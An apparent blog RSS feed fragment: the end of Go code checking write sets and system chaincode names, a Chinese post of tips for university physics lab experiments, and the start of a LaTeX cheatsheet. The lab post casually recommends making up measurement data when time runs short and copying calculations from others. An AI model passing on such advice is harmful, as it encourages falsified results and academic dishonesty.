&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;KvRwSet&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;KvRwSet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Writes&lt;/span&gt;) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// only look at collection data if we support that capability
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Capabilities&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;PrivateChannelData&lt;/span&gt;() {
		&lt;span style=&#34;color:#75715e&#34;&gt;// check for private writes for all collections
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CollHashedRwSets&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;HashedRwSet&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;HashedRwSet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;HashedWrites&lt;/span&gt;) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
				&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
			}

			&lt;span style=&#34;color:#75715e&#34;&gt;// only look at private metadata writes if we support that capability
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Capabilities&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;KeyLevelEndorsement&lt;/span&gt;() {
				&lt;span style=&#34;color:#75715e&#34;&gt;// private metadata updates
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;HashedRwSet&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;HashedRwSet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;MetadataWrites&lt;/span&gt;) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
					&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
				}
			}
		}
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// only look at metadata writes if we support that capability
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Capabilities&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;KeyLevelEndorsement&lt;/span&gt;() {
		&lt;span style=&#34;color:#75715e&#34;&gt;// public metadata updates
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;KvRwSet&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;KvRwSet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;MetadataWrites&lt;/span&gt;) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
		}
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCCAndNotInvokableExternal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vscc&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;escc&amp;#34;&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vscc&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;escc&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;qscc&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cscc&amp;#34;&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCCAndNotInvokableCC2CC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vscc&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;escc&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cscc&amp;#34;&lt;/span&gt;
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>基物实验</title>
        <link>/post/jwsy/</link>
        <pubDate>Tue, 17 Nov 2020 23:16:05 +0000</pubDate>
        
        <guid>/post/jwsy/</guid>
        <description>&lt;h2 id=&#34;分光仪&#34;&gt;分光仪&lt;/h2&gt;
&lt;p&gt;实验时间：2020年9月21日&lt;/p&gt;
&lt;p&gt;这是我做的第一个实验，成功AK（手动狗头）&lt;/p&gt;
&lt;h3 id=&#34;调整&#34;&gt;调整&lt;/h3&gt;
&lt;p&gt;第一步的粗调非常重要，决定了你接下来的调整速度。个人经验是在实验前千万不要去玩那些螺丝，也许上个人已经调好了，上来随便调一调就合格，可以直接做实验。&lt;/p&gt;
&lt;p&gt;按照正常的方法去调整就行，遇到的唯一困难就是转180°后找不到绿十字了，这时可以考虑先用眼睛去找，确定了绿十字反射回来的位置之后再去调目镜和平台，后面按照视频里或者老师讲的做就可以，应该没什么难度。&lt;/p&gt;
&lt;h3 id=&#34;测量三棱镜的顶角&#34;&gt;测量三棱镜的顶角&lt;/h3&gt;
&lt;p&gt;这个实验还是挺水的。。。随便测测就行了。顶角是60°，测量结果应该是120°&lt;/p&gt;
&lt;h3 id=&#34;最小偏向角法测量棱镜的折射率&#34;&gt;最小偏向角法测量棱镜的折射率&lt;/h3&gt;
&lt;p&gt;这个实验最大的坑就是“最小偏向角”一定要旋转三棱镜的摆放位置，直到折射光的偏转最小。（折射光在右手边就让光尽可能靠左，左手边就尽可能靠右）&lt;/p&gt;
&lt;p&gt;后面应该就不需要去动三棱镜了，钠光的入射光应该是可以找到的。&lt;/p&gt;
&lt;p&gt;最终的测量结果应该在50°50′左右。&lt;/p&gt;
&lt;h3 id=&#34;掠入射法测量棱镜的折射率&#34;&gt;掠入射法测量棱镜的折射率&lt;/h3&gt;
&lt;p&gt;当时做这个实验的时候主要是不知道怎么摆放。。。好在最后找了个做过的大佬，画了个草图。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 143; 
			flex-basis: 344px&#34;
	&gt;
	&lt;a href=&#34;/post/jwsy/%E6%8E%A0%E5%85%A5%E5%B0%84%E6%B5%8B%E9%87%8F%E6%A3%B1%E9%95%9C%E7%9A%84%E6%8A%98%E5%B0%84%E7%8E%87.jpg&#34; data-size=&#34;653x455&#34;&gt;
		&lt;img src=&#34;/post/jwsy/%E6%8E%A0%E5%85%A5%E5%B0%84%E6%B5%8B%E9%87%8F%E6%A3%B1%E9%95%9C%E7%9A%84%E6%8A%98%E5%B0%84%E7%8E%87.jpg&#34;
			width=&#34;653&#34;
			height=&#34;455&#34;
			srcset=&#34;/post/jwsy/%E6%8E%A0%E5%85%A5%E5%B0%84%E6%B5%8B%E9%87%8F%E6%A3%B1%E9%95%9C%E7%9A%84%E6%8A%98%E5%B0%84%E7%8E%87_hu084abbe72e00f556bc46223d9723342d_82715_480x0_resize_q75_box.jpg 480w, /post/jwsy/%E6%8E%A0%E5%85%A5%E5%B0%84%E6%B5%8B%E9%87%8F%E6%A3%B1%E9%95%9C%E7%9A%84%E6%8A%98%E5%B0%84%E7%8E%87_hu084abbe72e00f556bc46223d9723342d_82715_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最终的测量结果应该在39°左右。&lt;/p&gt;
&lt;p&gt;如果时间不够用的话，一个省时间的技巧是在测下一组数据的时候不动目镜，只转动刻度盘，这样就可以少调整一次。（如果彻底没有时间了，那就测量一组，然后写到第五组的位置上，剩下的数据全靠编。我室友就这么硬水过的。。。）&lt;/p&gt;
&lt;h3 id=&#34;干涉法测平板玻璃折射率&#34;&gt;干涉法测平板玻璃折射率&lt;/h3&gt;
&lt;p&gt;这个实验做了也不算积分，而且至少要1小时的时间，所以就没做（也没人做）。&lt;/p&gt;
&lt;h2 id=&#34;示波器&#34;&gt;示波器&lt;/h2&gt;
&lt;p&gt;实验时间：2020年10月26日&lt;/p&gt;
&lt;p&gt;做的第一个非光学实验（绪论除外），没能AK，后面就决定重回光学的怀抱了。&lt;/p&gt;
&lt;h3 id=&#34;示波器的使用&#34;&gt;示波器的使用&lt;/h3&gt;
&lt;p&gt;这个还是挺简单的，但建议速度一定要快，给后面两个实验留点时间。&lt;/p&gt;
&lt;p&gt;需要注意的是，这个实验老师是会查现象的，所以最好不要尝试去水。其实水的目的不是混分，都是现象做出来了，只是时间不够时的一个手段而已，非常不建议滥用，毕竟做出实验现象还是很爽的。&lt;/p&gt;
&lt;h3 id=&#34;二极管伏安特性曲线&#34;&gt;二极管伏安特性曲线&lt;/h3&gt;
&lt;p&gt;当时按照电路图连了电路，结果发现线貌似不够用，打算先测量声速。&lt;/p&gt;
&lt;p&gt;然后就没有然后了&lt;/p&gt;
&lt;h3 id=&#34;声速测量&#34;&gt;声速测量&lt;/h3&gt;
&lt;p&gt;测量声速的时候遇到了好几个坑。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;实验前和实验后一定要记得调整频率，使得振幅最大，并记录下来。&lt;/li&gt;
&lt;li&gt;实验的线材和器材有毒，各种连接不稳定，最后是用笔袋支撑着线才能做实验的。&lt;/li&gt;
&lt;li&gt;我当时老师要求振幅法和李萨如法都要用，很耽误时间，建议先做第二个实验。不过我当时的老师人比较好，让我们几个人拖延了一会，硬是把数据记完了，而且没有查实验器材。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;迈克尔逊干涉&#34;&gt;迈克尔逊干涉&lt;/h2&gt;
&lt;p&gt;实验时间：2020年11月9日&lt;/p&gt;
&lt;p&gt;第二个光学实验，也AK了。让人不禁感叹，光学实验真的是适合刷积分啊。&lt;/p&gt;
&lt;h3 id=&#34;迈克尔逊干涉-1&#34;&gt;迈克尔逊干涉&lt;/h3&gt;
&lt;p&gt;这个实验老师会讲好久（但里面有不少干货，建议认真听），我当时足足讲了1小时20分钟，讲到最后我都直接开激光偷偷调整了。&lt;/p&gt;
&lt;p&gt;整个调整步骤有四步，一步一步来就行，别忘了第一步是调激光入射光就行（我做完实验才发现这个事情，还好最后没出现问题）。如果发现自己找不到水平一排的三个亮点，可能是入射光没有完全射到各个镜子上，调整的时候出现问题了还是动脑子想一想吧，毕竟遇到的问题真的是各种各样的都有。&lt;/p&gt;
&lt;p&gt;如果发现迈克尔逊环很密的话，可能是反射镜位置不太对，调整到老师推荐的位置，然后拧一拧应该就能出来。&lt;/p&gt;
&lt;p&gt;装置的空程差真的让人绝望，我一开始大概转了60圈才消除掉，&lt;/p&gt;
&lt;p&gt;数的时候真的可能会数错。。。建议十个十个数。技巧就是一定要数内缩环，外扩真的纠结应该数到哪里。&lt;/p&gt;
&lt;h3 id=&#34;牛顿环干涉&#34;&gt;牛顿环干涉&lt;/h3&gt;
&lt;p&gt;感觉牛顿环是最简单的实验了，只需要调好反射镜的位置和目镜的高度就行。重点是不要数错环，我当时是从11数到20。。。建议从6数到15。&lt;/p&gt;
&lt;p&gt;数错了重新数其实也浪费不了多少时间，如果懒的话就继续编数据大法吧。。。&lt;/p&gt;
&lt;h3 id=&#34;劈尖干涉&#34;&gt;劈尖干涉&lt;/h3&gt;
&lt;p&gt;这个实验的劈尖干涉应该是来得及做的，我当时最后有几十分钟的时间来纠结应该怎么做（其实想法一直都没问题，但我的仪器测量范围有问题，浪费了巨量时间）。当时认识的大佬没做这个实验，于是只能自己摸索了。下面是我总结的实验步骤。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;本实验的样本无须自己制作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;做实验过程中遇到的唯一障碍在于测量“细丝位置到尖端的距离”。我遇到的样本为一张纸，因此与图片中的细丝有些小差别。实际操作中的装置如下图所示（左侧是尖端，右侧的小横线是纸张）。图片中的L就是需要测量的部分。具体做法大致就是把装置侧过来，显微镜对焦，然后从尖端量到纸张即可。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 166; 
			flex-basis: 398px&#34;
	&gt;
	&lt;a href=&#34;/post/jwsy/%E5%8A%88%E5%B0%96%E8%A3%85%E7%BD%AE%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg&#34; data-size=&#34;681x410&#34;&gt;
		&lt;img src=&#34;/post/jwsy/%E5%8A%88%E5%B0%96%E8%A3%85%E7%BD%AE%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg&#34;
			width=&#34;681&#34;
			height=&#34;410&#34;
			srcset=&#34;/post/jwsy/%E5%8A%88%E5%B0%96%E8%A3%85%E7%BD%AE%E7%A4%BA%E6%84%8F%E5%9B%BE_huc397dbc36bb297b451d290f8005b5bcf_111783_480x0_resize_q75_box.jpg 480w, /post/jwsy/%E5%8A%88%E5%B0%96%E8%A3%85%E7%BD%AE%E7%A4%BA%E6%84%8F%E5%9B%BE_huc397dbc36bb297b451d290f8005b5bcf_111783_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;我用的仪器貌似有问题。。。小于25mm的部分手轮转不过去，最后还是借室友的仪器做的&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在测量干涉条纹宽度时，显微镜物镜可能会被螺丝卡住，建议把装置倒过来测量，把四个突出来的螺丝放在下面当支柱。。。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;我的测量结果是$L\approx39\ \mathrm{mm}$, $n=5$时$l\approx5.6\ \mathrm{mm}$。反正最后处理时别忘了还有个$n$就行，刚开始算出来的结果给我人都看傻了，最后算的大概是$50\mu m$，感觉小了一些，不过至少还有点靠谱。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;钠光干涉&#34;&gt;钠光干涉&lt;/h2&gt;
&lt;p&gt;时间：2020年11月16日&lt;/p&gt;
&lt;p&gt;第三个光学实验，第一个非必修实验。&lt;/p&gt;
&lt;p&gt;这次没有AK（这句话导致我险些被室友暴打）。还是大意了，没有闪。&lt;/p&gt;
&lt;h3 id=&#34;钠光双棱镜&#34;&gt;钠光双棱镜&lt;/h3&gt;
&lt;p&gt;本实验的仪器调整步骤很坑，耽误了巨量时间。。。最后只能卡点强行搞完双棱镜的实验。&lt;/p&gt;
&lt;p&gt;我最后总结的调整方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;前面用ppt或者书上的方法都行，毕竟各个元器件的高度之类的还是比较好调的。&lt;/li&gt;
&lt;li&gt;到最后找大小像和干涉条纹时，一定要先找干涉条纹，老师也强调了，但没说怎么操作。。。搞得我各种前后移动最后还是找不到。最后发现是双棱镜和狭缝不平行所导致的。&lt;/li&gt;
&lt;li&gt;最好的方法是先参考别人的报告摆放好狭缝和双棱镜的位置（这样可以确保有20个条纹），让目镜紧贴双棱镜，旋转双棱镜或调整狭缝宽度以找到清晰的干涉条纹，再把目镜拉到正确的位置，找大小像并把叉丝调到中心。&lt;/li&gt;
&lt;li&gt;实验室的双棱镜上半部分是空的，会漏光。所以如果发现目镜拉远后干涉条纹被光盖住了，可以试试把双棱镜位置提高一点。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;另外，感觉目镜手轮的4和5很容易读错，读的时候一定要注意一点。仪器的位置最好和已有实验报告的位置差不多，可以对着别人的数据检查，不然最后数据偏差过大就傻了。这种东西能水过去就尽量水过去吧。。。&lt;/p&gt;
&lt;h3 id=&#34;钠光劳埃镜&#34;&gt;钠光劳埃镜&lt;/h3&gt;
&lt;p&gt;勉强做完双棱镜，gg。祝xdm好运。&lt;/p&gt;
&lt;h2 id=&#34;稳态法测不良导体热导率&#34;&gt;稳态法测不良导体热导率&lt;/h2&gt;
&lt;p&gt;时间：2020年12月5日&lt;/p&gt;
&lt;p&gt;第一个热学实验，英文实验+研究性实验&lt;/p&gt;
&lt;p&gt;热学实验就离谱。把装置调好之后等着就行了，建议带个作业去写，或者把器材的数据简单处理一下。大概得等1个多小时吧，加热盘温度到达75℃之后再等散热盘温度稳定就行了。实际操作的时候不一定非要到75℃，毕竟示数会有误差，加到74.9℃之后发现一直没变化就可以记录了。（试验台在过道边上是真的坑，走来走去的对实验结果真的有影响）&lt;/p&gt;
&lt;p&gt;英文实验熟悉了老师的口语之后还是可以听懂的。我当时的老师人很好，和他说了想做研究性实验之后说可以让我们一直搞到下午上课前，后来直接让我们去没人的实验台做实验了（最后大概拖了30分钟）。&lt;/p&gt;
&lt;p&gt;我做的研究性实验就是做了个无风扇的实验，然后两个实验进行对比，结论是有风扇实验系统误差高，无风扇实验偶然误差高，并为实验在风扇上提出了两个改进方案。做研究性实验的话建议去知网找找，我就是在知网找到一篇比较风扇的论文，然后自己做实验，实验原理找了个物竞大佬教。&lt;/p&gt;
&lt;p&gt;（感觉上课和老师聊研究性实验的时候，全班同学都在用一种怪异的眼神看着我&amp;hellip;）&lt;/p&gt;
&lt;h2 id=&#34;电位差计及其应用&#34;&gt;电位差计及其应用&lt;/h2&gt;
&lt;p&gt;时间：2020年12月14日&lt;/p&gt;
&lt;p&gt;第一次真正意义上的电学实验&lt;/p&gt;
&lt;p&gt;积分已经够了，所以这次实验就比较划水&lt;/p&gt;
&lt;h3 id=&#34;自足电位差计&#34;&gt;自足电位差计&lt;/h3&gt;
&lt;p&gt;实验的电路黑板上已经画出来了，照着连接就行。这个实验不需要电流表，使用两个电阻箱进行实验。先根据标准电压的电压值（随环境温度变化）调$R_1$（比如$E_N=1.01842V$时，$R_1=1018.4\Omega$），然后调$R_2$使得灵敏测微计无偏即可。后面就照常测量即可，一些细节老师课上都会讲。老师用万用表测出来的可能有偏差（我当时是万用表结果低了$0.004V$左右）。&lt;/p&gt;
&lt;h3 id=&#34;箱式电位差计测量电压&#34;&gt;箱式电位差计测量电压&lt;/h3&gt;
&lt;p&gt;按照老师讲的去连线就行，特别注意，在最后读数的时候需要把粗调旋钮按下去。&lt;/p&gt;
&lt;p&gt;如果没有反应，也有可能是不小心把电源关上了。&lt;/p&gt;
&lt;p&gt;后面的实验就没有做，因为没做啥准备工作，现场也没想好怎么测量&amp;hellip;&lt;/p&gt;
&lt;h2 id=&#34;绪论实验&#34;&gt;绪论实验&lt;/h2&gt;
&lt;p&gt;实验时间：2020年10月12日&lt;/p&gt;
&lt;p&gt;绪论实验没什么好说的，就是上来会有个小测验，建议稍微准备一下。我那次雨课堂测试，十几个人平均分3.8/10，就nm离谱。&lt;/p&gt;
&lt;p&gt;绪论的报告要求会略高一点点，既要列出公式也要把数值带进去的式子写上，最后再写答案。计算步骤直接上知乎抄吧。&lt;/p&gt;
&lt;p&gt;听说最后的给分都挺低，4分就算不错了。也不知道是不是真的。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>My Latex Cheatsheet</title>
        <link>/post/my-latex-cheatsheet/</link>
        <pubDate>Sun, 15 Nov 2020 23:45:58 +0000</pubDate>
        
        <guid>/post/my-latex-cheatsheet/</guid>
        <description>&lt;h2 id=&#34;标题及基础设置&#34;&gt;标题及基础设置&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\documentclass&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[a4paper, zihao=-4, UTF8]&lt;/span&gt;{ctexart}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\CTEXsetup&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[format={\Large\bfseries}]&lt;/span&gt;{section}

&lt;span style=&#34;color:#66d9ef&#34;&gt;\title&lt;/span&gt;{}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\author&lt;/span&gt;{}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\date&lt;/span&gt;{}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\pagesytle&lt;/span&gt;{}

&lt;span style=&#34;color:#75715e&#34;&gt;%\setcounter{section}{-1}   % section start from 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{document}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\maketitle&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\section&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\section&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[short title]&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\label&lt;/span&gt;{sec:section_with_short_title}
	section &lt;span style=&#34;color:#66d9ef&#34;&gt;\ref&lt;/span&gt;{sec:section_with_short_title} is a section with a short title. &lt;span style=&#34;color:#75715e&#34;&gt;%交叉引用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;\section*&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\subsection&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\subsection*&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\subsubsection&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\subsubsection*&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\paragraph&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\par&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{document}
